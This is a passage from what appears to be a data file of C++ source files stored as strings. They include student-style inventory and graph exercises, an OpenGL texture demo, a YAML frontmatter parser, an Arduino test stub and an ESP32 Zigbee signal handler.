6}});\n    ASSERT_EQ(m.getShape(), Shape(1, 6));\n    m.reshape({2, 3});\n    ASSERT_EQ(m.getShape(), Shape(2, 3));\n}\n}  // namespace test\n}  // namespace mca\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <map>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\n// Class c\u01a1 b\u1ea3n cho S\u1eefa\r\nclass Sua {\r\nprotected:\r\n    std::string maHang;\r\n    std::string tenHang;\r\n    std::string ngaySanXuat;\r\n    std::string ngayHetHan;\r\n    std::string noiSanXuat;\r\n    int donGiaNhap;\r\n    int donGiaBan;\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    Sua() : maHang(\"\"), tenHang(\"\"), ngaySanXuat(\"\"), ngayHetHan(\"\"), noiSanXuat(\"\"), donGiaNhap(0), donGiaBan(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    Sua(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb)\r\n        : maHang(ma), tenHang(ten), ngaySanXuat(nsx), ngayHetHan(hsd), noiSanXuat(noiSX), donGiaNhap(dgn), donGiaBan(dgb) {}\r\n\r\n    // Getter v\u00e0 Setter cho c\u00e1c thu\u1ed9c t\u00ednh\r\n    std::string getMaHang() const { return maHang; }\r\n    void setMaHang(const std::string& ma) { maHang = ma; }\r\n    std::string getTenHang() const { return tenHang; }\r\n    void setTenHang(const std::string& ten) { tenHang = ten; }\r\n    std::string getNgaySanXuat() const { return ngaySanXuat; }\r\n    void setNgaySanXuat(const std::string& nsx) { ngaySanXuat = nsx; }\r\n    std::string getNgayHetHan() const { return ngayHetHan; }\r\n    void setNgayHetHan(const std::string& hsd) { ngayHetHan = hsd; }\r\n    std::string getNoiSanXuat() const { return noiSanXuat; }\r\n    void setNoiSanXuat(const std::string& noiSX) { noiSanXuat = noiSX; }\r\n    int getDonGiaNhap() const { return donGiaNhap; }\r\n    void setDonGiaNhap(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 nh\u1eadp kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaNhap = value;\r\n    }\r\n    int getDonGiaBan() const { return donGiaBan; }\r\n    void setDonGiaBan(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 b\u00e1n kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaBan = value;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb b\u00e0n ph\u00edm\r\n    void nhapThongTin() {\r\n        cout << \"Nhap ma hang: \";\r\n        std::getline(cin, maHang);\r\n        cout << \"Nhap ten hang: \";\r\n        std::getline(cin, tenHang);\r\n        cout << \"Nhap ngay san xuat (YYYY-MM-DD): \";\r\n        std::getline(cin, ngaySanXuat);\r\n        cout << \"Nhap ngay het han (YYYY-MM-DD): \";\r\n        std::getline(cin, ngayHetHan);\r\n        cout << \"Nhap noi san xuat: \";\r\n        std::getline(cin, noiSanXuat);\r\n        cout << \"Nhap don gia nhap: \";\r\n        cin >> donGiaNhap;\r\n        cout << \"Nhap don gia ban: \";\r\n        cin >> donGiaBan;\r\n        cin.ignore();\r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin\r\n    void xuatThongTin() const {\r\n        cout << \"Ma hang: \" << maHang << std::endl;\r\n        cout << \"Ten hang: \" << tenHang << std::endl;\r\n        cout << \"Ngay san xuat: \" << ngaySanXuat << std::endl;\r\n        cout << \"Ngay het han: \" << ngayHetHan << std::endl;\r\n        cout << \"Noi san xuat: \" << noiSanXuat << std::endl;\r\n        cout << \"Don gia nhap: \" << donGiaNhap << std::endl;\r\n        cout << \"Don gia ban: \" << donGiaBan << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa B\u1ed9t k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaBot : public Sua {\r\nprivate:\r\n    int trongLuong; // Tr\u1ecdng l\u01b0\u1ee3ng (g)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 6 lon\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaBot() : Sua(), trongLuong(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaBot(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int tl)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), trongLuong(tl) {}\r\n\r\n    // Getter v\u00e0 Setter cho trongLuong\r\n    int getTrongLuong() const { return trongLuong; }\r\n    void setTrongLuong(int tl) {\r\n        if (tl < 0) {\r\n            throw std::invalid_argument(\"Tr\u1ecdng l\u01b0\u1ee3ng kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        trongLuong = tl;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void nhapThongTin() {\r\n        Sua::nhapThongTin(); // G\u1ecdi h\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Nhap trong luong (g): \";\r\n        cin >> trongLuong;\r\n        cin.ignore(); \r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void xuatThongTin() const {\r\n        Sua::xuatThongTin(); // G\u1ecdi h\u00e0m xu\u1ea5t th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Trong luong: \" << trongLuong << \" g\" << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa Pha S\u1eb5n k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaPhaSan : public Sua {\r\nprivate:\r\n    int dungTich; // Dung t\u00edch (ml)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 48 h\u1ed9p\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaPhaSan() : Sua(), dungTich(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaPhaSan(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int dt)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), dungTich(dt) {}\r\n\r\n    // Getter v\u00e0 Setter cho dungTich\r\n    int getDungTich() const { return dungTich; }\r\n    void setDungTich(int",
    "//\n// Created by ivan on 2024/5/4.\n//\n#include <GL.hpp>\n#include <Shader.hpp>\n#include <StbImage.hpp>\n#include <spdlog/spdlog.h>\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    lgl::GL gl;\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<float> vertices{\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n    };\n    std::vector<unsigned int> indices = {\n        0, 1, 3,\n        1, 2, 3,\n    };\n\n    unsigned int vbo, vao, ebo;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n    glGenBuffers(1, &ebo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ebo);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(*indices.data()), indices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto texCoordLoc = shader.get_attribute_location(\"aTexCoord\");\n    glVertexAttribPointer(texCoordLoc, 2, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()),\n                          (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(texCoordLoc);\n\n    unsigned int texture1;\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image1(\"../assets/container.jpg\");\n    spdlog::info(\"image1: width = {}, height = {}, channel = {}\", image1.width(), image1.height(), image1.channel());\n    if (image1()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, image1.width(), image1.height(), 0, GL_RGB, GL_UNSIGNED_BYTE, image1);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image1.release();\n\n    unsigned int texture2;\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image2(\"../assets/awesomeface.png\", true);\n    spdlog::info(\"image2: width = {}, height = {}, channel = {}\", image2.width(), image2.height(), image2.channel());\n    if (image2()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image2.width(), image2.height(), 0, GL_RGBA, GL_UNSIGNED_BYTE, image2);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image2.release();\n\n    shader.use();\n    glUniform1i(shader.get_uniform_location(\"uTexture1\"), 0);\n    glUniform1i(shader.get_uniform_location(\"uTexture2\"), 1);\n\n    std::vector cubePositions {\n        glm::vec3( 0.1f,  0.0f,  0.0f),\n        glm::vec3( 2.0f,  5.0f, -15.0f),\n        glm::vec3(-1.5f, -2.2f, -2.5f),\n        glm::vec3(-3.8f, -2.0f, -12.3f),\n        glm::vec3( 2.4f, -0.4f, -3.",
    "#include \"frontmatter.hpp\"\n#include \"nlohmann/json.hpp\"\n#include \"yaml.hpp\"\n#include <cstddef>\n#include <cstdio>\n#include <string>\n#include <tuple>\n\nstd::tuple<size_t, size_t> find_frontmatter(std::string input) {\n  size_t first = input.find(\"---\");\n\n  std::string rest = input.substr(first + 3, input.length());\n\n  size_t last = rest.find(\"---\") + 3;\n\n  return std::make_tuple(first, last);\n}\n\nstd::string strip_frontmatter(std::string input) {\n  std::tuple<size_t, size_t> fm = find_frontmatter(input);\n\n  size_t start = std::get<0>(fm);\n  size_t end = std::get<1>(fm);\n\n  // no idea if this works (probably not)\n  return input.substr(end + 3);\n}\n\nnlohmann::json parse_frontmatter(std::string input) {\n  nlohmann::json data;\n\n  // get the starting and ending position of the frontmatter excluding the\n  // dashes\n  std::tuple<size_t, size_t> fm = find_frontmatter(input);\n\n  size_t start = std::get<0>(fm) + 3;\n  size_t end = std::get<1>(fm) - 3;\n\n  std::string raw_yaml = input.substr(start, end);\n\n  // parse yaml\n  Yaml::Node yaml;\n  Yaml::Parse(yaml, raw_yaml);\n\n  for (auto it = yaml.Begin(); it != yaml.End(); it++) {\n    // maybe we can make value support other data types?\n    std::string key = (*it).first;\n    std::string value = (*it).second.As<std::string>();\n\n    data[key] = value;\n  }\n\n  return data;\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include<iostream>\n#include <cstdlib>\n#include\"../skip_list/skip_list.h\"\nusing namespace std;\n\n\nint main() {\n    setlocale(LC_ALL, \"rus\");\n    SkipList<int> sl(20, 0.5); \n    int choice;\n    int value;\n\n    do {\n        system(\"cls\");\n        cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5:\" << endl;\n        cout << \"1. \u00c2\u00f1\u00f2\u00e0\u00e2\u00e8\u00f2\u00fc \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"2. \u00d3\u00e4\u00e0\u00eb\u00e8\u00f2\u00fc \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"3. \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00e8\u00f2\u00fc, \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00f2\u00f1\u00ff \u00eb\u00e8 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\" << endl;\n        cout << \"4. \u00c2\u00fb\u00e2\u00e5\u00f1\u00f2\u00e8 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea\" << endl;\n        cout << \"0. \u00c2\u00fb\u00e9\u00f2\u00e8\" << endl;\n        cout << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00e2\u00f1\u00f2\u00e0\u00e2\u00ea\u00e8: \";\n            cin >> value;\n            sl.insert(value);\n            cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea.\" << endl;\n            system(\"pause\");\n            break;\n        case 2:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00f3\u00e4\u00e0\u00eb\u00e5\u00ed\u00e8\u00ff: \";\n            cin >> value;\n            sl.remove(value);\n            cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00f3\u00e4\u00e0\u00eb\u00e5\u00ed \u00e8\u00e7 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0.\" << endl;\n            system(\"pause\");\n            break;\n        case 3:\n            cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e8\u00f1\u00ea\u00e0: \";\n            cin >> value;\n            if (sl.search(value)) {\n                cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e5.\" << endl;\n            }\n            else {\n                cout << \"\u00dd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e5.\" << endl;\n            }\n            system(\"pause\");\n            break;\n        case 4:\n            cout << \"\u00d1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00ec\u00ee\u00e5 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0:\" << endl;\n            sl.printList();\n            system(\"pause\");\n            break;\n        case 0:\n            cout << \"\u00c2\u00fb\u00f5\u00ee\u00e4.\" << endl;\n            break;\n        default:\n            cout << \"\u00cd\u00e5\u00e2\u00e5\u00f0\u00ed\u00fb\u00e9 \u00e2\u00e2\u00ee\u00e4. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00e5\u00f9\u00e5 \u00f0\u00e0\u00e7.\" << endl;\n            system(\"pause\");\n        }\n\n    } while (choice != 0);\n\n    return 0;\n}",
    "/*\r\nesp_zb_get_short_address() - \u0431\u044b\u0441\u0442\u0440\u044b\u0439 \u0441\u043f\u043e\u0441\u043e\u0431 \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0441\u0435\u0442\u0438, \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u043e\u0439 \u043f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435. \u0415\u0441\u043b\u0438 \u0441\u0435\u0442\u044c \u043d\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u0430, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0431\u0443\u0434\u0435\u0442 0xfffe.\r\n\r\nhttps://github.com/espressif/esp-zigbee-sdk/issues/84\r\n*/\r\n\r\n//#include <Arduino.h>\r\n#include \"esp_log.h\"\r\n#include \"esp_check.h\"\r\n#include \"freertos/FreeRTOS.h\"\r\n#include \"freertos/task.h\"\r\n#include \"esp_zigbee_type.h\"\r\n#include \"esp_zigbee_core.h\"\r\n#include \"esp_ota_ops.h\"\r\n#include \"nvs_flash.h\"\r\n//#include \"ha/esp_zigbee_ha_standard.h\"\r\n//#include \"zcl/esp_zigbee_zcl_command.h\"\r\n//#include \"zdo/esp_zigbee_zdo_command.h\"\r\n//#include \"zb_crc16.h\"\r\n#include \"zb_zcl.h\"\r\n#include \"zbesp_runtime.h\"\r\n//#include \"zbesp_debug.h\"\r\n\r\n#define TAG \"zbesp_runtime\"\r\n\r\nZbDevice *g_device;\r\n\r\n/*\r\nstatic void set_zcl_string(char *buffer, char *value)\r\n{\r\n    buffer[0] = (char) strlen(value);\r\n    memcpy(buffer + 1, value, buffer[0]);\r\n}\r\n*/\r\n\r\nstatic void bdb_start_top_level_commissioning_cb(uint8_t mode_mask)\r\n{\r\n    ESP_ERROR_CHECK(esp_zb_bdb_start_top_level_commissioning(mode_mask));\r\n}\r\n\r\n// https://github.com/espressif/esp-zigbee-sdk/blob/main/examples/esp_zigbee_HA_sample/HA_color_dimmable_light/main/esp_zb_light.c\r\n// https://github.com/espressif/esp-idf/blob/master/examples/zigbee/esp_zigbee_gateway/main/esp_zigbee_gateway.c\r\nextern \"C\" void esp_zb_app_signal_handler(esp_zb_app_signal_t *signal_struct)\r\n{\r\n    uint32_t *p_sg_p = signal_struct->p_app_signal;\r\n    esp_err_t err_status = signal_struct->esp_err_status;\r\n    esp_zb_app_signal_type_t sig_type = (esp_zb_app_signal_type_t)*p_sg_p;\r\n    esp_zb_zdo_signal_leave_params_t *leave_params;\r\n\r\n    ESP_LOGI(TAG, \"ZDO signal: %s (sig_type=0x%x), status: %s\", esp_zb_zdo_signal_to_string(sig_type), sig_type, esp_err_to_name(err_status));\r\n\r\n    switch (sig_type) {\r\n    case ESP_ZB_ZDO_SIGNAL_SKIP_STARTUP:\r\n        ESP_LOGI(TAG, \"Initialize Zigbee stack\");\r\n        esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_INITIALIZATION);\r\n        break;\r\n    case ESP_ZB_BDB_SIGNAL_DEVICE_FIRST_START:\r\n    case ESP_ZB_BDB_SIGNAL_DEVICE_REBOOT:\r\n        if (err_status == ESP_OK) {\r\n            ESP_LOGI(TAG, \">\");\r\n            if(g_device->p_deferredInitCB) \r\n                ESP_LOGI(TAG, \"Deferred initialization %s\", g_device->p_deferredInitCB() ? \"failed.\" : \"successful.\");\r\n            ESP_LOGI(TAG, \"Device started up in %sfactory-reset mode\", esp_zb_bdb_is_factory_new() ? \"\" : \"NON \");\r\n            if (esp_zb_bdb_is_factory_new()) {\r\n                ESP_LOGI(TAG, \"Start network steering\");\r\n                esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_NETWORK_STEERING);\r\n            } else {\r\n                g_device->setJoined(true); // \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430, \u0441\u0447\u0438\u0442\u0430\u0435\u043c, \u0447\u0442\u043e \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e \u0441\u0430\u043c\u043e \u0432\u043e\u0439\u0434\u0435\u0442 \u0432 \u0441\u0435\u0442\u044c\r\n                ESP_LOGI(TAG, \"Device was rebooted\");\r\n            }\r\n        } else {\r\n            ESP_LOGW(TAG, \"Failed to initialize Zigbee stack (status: %s), try to factory reset.\", esp_err_to_name(err_status));\r\n        }\r\n        break;\r\n    case ESP_ZB_BDB_SIGNAL_STEERING:\r\n        if (err_status == ESP_OK) {\r\n            g_device->setJoined(true);\r\n            esp_zb_ieee_addr_t extended_pan_id;\r\n            esp_zb_get_extended_pan_id(extended_pan_id);\r\n            ESP_LOGI(TAG, \"Joined network successfully (Extended PAN ID: %02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x, PAN ID: 0x%04hx, Channel:%d, Short Address: 0x%04hx)\",\r\n                     extended_pan_id[7], extended_pan_id[6], extended_pan_id[5], extended_pan_id[4],\r\n                     extended_pan_id[3], extended_pan_id[2], extended_pan_id[1], extended_pan_id[0],\r\n                     esp_zb_get_pan_id(), esp_zb_get_current_channel(), esp_zb_get_short_address());\r\n        } else {\r\n            g_device->setJoined(false);\r\n            ESP_LOGI(TAG, \"Network steering was not successful (status: %s)\", esp_err_to_name(err_status));\r\n            esp_zb_scheduler_alarm((esp_zb_callback_t)bdb_start_top_level_commissioning_cb, ESP_ZB_BDB_MODE_NETWORK_STEERING, 1000);\r\n        }\r\n        break;\r\n    case ESP_ZB_NWK_SIGNAL_PERMIT_JOIN_STATUS:\r\n        if (err_status == ESP_OK) {\r\n            if (*(uint8_t *)esp_zb_app_signal_get_params(p_sg_p)) {\r\n                ESP_LOGI(TAG, \"Network(0x%04hx) is open for %d seconds\", esp_zb_get_pan_id(), *(uint8_t *)esp_zb_app_signal_get_params(p_sg_p));\r\n            } else {\r\n                ESP_LOGW(TAG, \"Network(0x%04hx) closed, devices joining not allowed.\", esp_zb_get_pan_id());\r\n            }\r\n        }\r\n        break;\r\n\r\n        //https://github.com/otaviojr/zigbee_light_sensor/blob/master/main.c\r\n        //https://github.com/espressif/esp-zigbee-sdk/issues/66\r\n\r\n    case ESP_ZB_ZDO_SIGNAL_LEAVE:\r\n        leave_params = (esp_zb_zdo_signal_leave_params_t *) esp_zb_app_signal_get_params(p_sg_p);\r\n        //ESP_LOGI(TAG, \"****** ESP_ZB_ZDO_SIGNAL_LEAVE (leave_type=%d)\", leave_params->leave_type);\r\n        g_device->setJoined(false);\r\n        if (leave_params->leave_type == ESP_ZB_NWK_LEAVE_TYPE_RESET) {\r\n            E",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\n\nconst int MAX = 20;\n\nstruct maTrix {\n\tint maTranKe[MAX][MAX];\n\tint soDinh;\n};\n\nvoid readFile(maTrix& mtk) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep\";\n\t\treturn;\n\t}\n\n\tinFile >> mtk.soDinh;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tinFile >> mtk.maTranKe[i][j];\n\t\t}\n\t}\n\tinFile.close();\n}\n\nvoid outputMaTrix(maTrix mtk) {\n\tcout << \"\\nMA TRAN KE: \" << endl;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tcout << mtk.maTranKe[i][j] << \"\\t\";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\n//  H\u00e0m tr\u1ea3 v\u1ec1 s\u1ed1 c\u1ea1nh c\u1ee7a \u0111\u1ed3 th\u1ecb\nint soCanhDoThi(maTrix mtk) {\n\tint tongSoCanh = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tif (mtk.maTranKe[i][j] != 0)\n\t\t\t\ttongSoCanh++;\n\t\t}\n\t}\n\treturn tongSoCanh;\n}\n\n// T\u00ednh b\u1eadc ra c\u1ee7a \u0111\u1ed3 th\u1ecb \nint outDeg(maTrix mtk, int 